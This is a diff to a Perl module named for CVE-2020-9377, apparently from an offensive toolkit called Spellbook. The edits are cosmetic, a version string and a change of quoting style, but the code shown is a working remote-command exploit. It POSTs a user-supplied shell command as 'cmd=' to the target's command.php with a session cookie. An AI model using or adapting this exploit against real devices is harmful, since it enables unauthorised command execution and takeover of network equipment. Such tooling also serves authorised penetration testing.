@@ -2,17 +2,19 @@ package Spellbook::Advisory::CVE_2020_9377 {
     use strict;
     use warnings;
     use Spellbook::Core::UserAgent;
-    
+
+    our $VERSION = '0.0.1';
+
     sub new {
         my ($self, $parameters) = @_;
         my ($help, $target, $cookie, $command, @results);
 
         Getopt::Long::GetOptionsFromArray (
             $parameters,
-            "h|help"     => \$help,
-            "t|target=s" => \$target,
-            "c|cookie=s" => \$cookie,
-            "p|payload=s" => \$command
+            'h|help'     => \$help,
+            't|target=s' => \$target,
+            'c|cookie=s' => \$cookie,
+            'p|payload=s' => \$command
         );
 
         if ($target) {
@@ -24,8 +26,8 @@ package Spellbook::Advisory::CVE_2020_9377 {
             my $payload   = "cmd=$command";
             
             my $headers   = HTTP::Headers -> new (
-                "Content-Type" => "application/x-www-form-urlencoded",
-                "Cookie" => "uid=$cookie"
+                'Content-Type' => "application/x-www-form-urlencoded",
+                'Cookie' => "uid=$cookie"
             );
 
             my $request   = HTTP::Request -> new("POST", "$target/command.php", $headers, $payload);
